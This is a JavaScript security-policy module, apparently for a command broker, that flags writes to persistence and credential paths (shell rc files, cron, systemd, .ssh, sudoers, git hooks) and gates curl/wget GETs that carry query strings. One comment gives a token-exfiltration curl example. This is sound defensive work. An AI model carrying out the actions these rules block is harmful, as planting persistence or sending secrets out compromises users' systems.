// Security policy data: sensitive filesystem paths + network egress rules.
// Kept separate from the broker so the classification logic stays small and the
// policy is auditable in one place.

import os from "node:os";
import path from "node:path";

// --- Sensitive paths -------------------------------------------------------
// Writing (or deleting) these is snapshot-reversible ON DISK, but their content
// has side effects that can fire BEFORE anyone runs the undo: shell startup
// files, scheduled jobs, service units, auth material. A malicious or mistaken
// write here can plant persistence or exfiltration that executes on the next
// login / timer / connection. So we treat them as irreversible and gate them,
// even though the bytes themselves are recoverable.
const SENSITIVE = [
  // shell startup / profile (run code on every login or shell)
  /(^|\/)\.(bash|zsh|ksh)(rc|_profile|_login|_logout|env)$/,
  /(^|\/)\.profile$/,
  /(^|\/)\.config\/fish\/config\.fish$/,
  /\/etc\/(profile|bash\.bashrc|environment|shells|zsh\/)/,
  /\/etc\/profile\.d(\/|$)/,
  // scheduled execution
  /\/etc\/cron/, /\/var\/spool\/cron/, /(^|\/)crontab$/,
  // service / init units (run code as a service)
  /\/etc\/systemd(\/|$)/, /(^|\/)\.config\/systemd(\/|$)/,
  /\.(service|timer|socket)$/,
  // authentication / privilege
  /(^|\/)\.ssh(\/|$)/, /(^|\/)authorized_keys$/,
  /\/etc\/sudoers/, /\/etc\/pam\.d(\/|$)/,
  // code-execution config (git hooks/aliases, npm/pip install hooks)
  /(^|\/)\.gitconfig$/, /(^|\/)\.git\/hooks(\/|$)/,
  /(^|\/)\.npmrc$/,
];

// Resolve ~ and relative segments so `../../.bashrc` and `~/.ssh/x` both match.
function normalize(p) {
  const raw = String(p || "");
  const expanded = raw.replace(/^~(?=\/|$)/, os.homedir());
  try {
    return path.resolve(expanded);
  } catch {
    return expanded;
  }
}

export function isSensitivePath(p) {
  if (!p) return false;
  const resolved = normalize(p);
  const raw = String(p);
  return SENSITIVE.some((re) => re.test(resolved) || re.test(raw));
}

// --- Network egress --------------------------------------------------------
// A plain GET that prints a response is reversible. But a GET carrying a query
// string is a data-exfiltration channel (`curl host/log?token=$API_KEY`), and
// the broker's global danger scan only catches `$(...)`, not `$VAR` expansion.
// So: any GET with a query string is gated UNLESS its host is explicitly
// trusted via NEFERTARI_NET_ALLOW (comma-separated hosts; a bare domain also
// matches its subdomains).

function allowedHosts() {
  return (process.env.NEFERTARI_NET_ALLOW || "")
    .split(",")
    .map((s) => s.trim().toLowerCase())
    .filter(Boolean);
}

export function hostAllowed(host) {
  if (!host) return false;
  const h = host.toLowerCase();
  return allowedHosts().some((a) => h === a || h.endsWith("." + a));
}

// Pull the first URL/host-looking token out of a curl/wget segment (skipping
// flags and their obvious values).
export function extractUrl(seg) {
  const tokens = String(seg).trim().split(/\s+/).slice(1); // drop curl/wget itself
  for (const t of tokens) {
    if (t.startsWith("-")) continue;
    const bare = t.replace(/^["']|["']$/g, "");
    if (/^https?:\/\//i.test(bare)) return bare;
    if (/^[a-z0-9.-]+\.[a-z]{2,}(?:[:/?]|$)/i.test(bare)) return bare;
  }
  return null;
}

// Returns "reversible" | "irreversible" for a curl/wget segment already known
// to be free of --data/-o/POST style exfil flags (those are handled upstream).
export function classifyNet(seg) {
  const url = extractUrl(seg);
  if (!url) return "reversible"; // no target we can identify => nothing sent out
  let host = null;
  let hasQuery = url.includes("?");
  try {
    const u = new URL(/^https?:\/\//i.test(url) ? url : "http://" + url);
    host = u.hostname;
    hasQuery = hasQuery || u.search.length > 1;
  } catch {
    /* keep the substring-based hasQuery */
  }
  if (hostAllowed(host)) return "reversible";
  return hasQuery ? "irreversible" : "reversible";
}
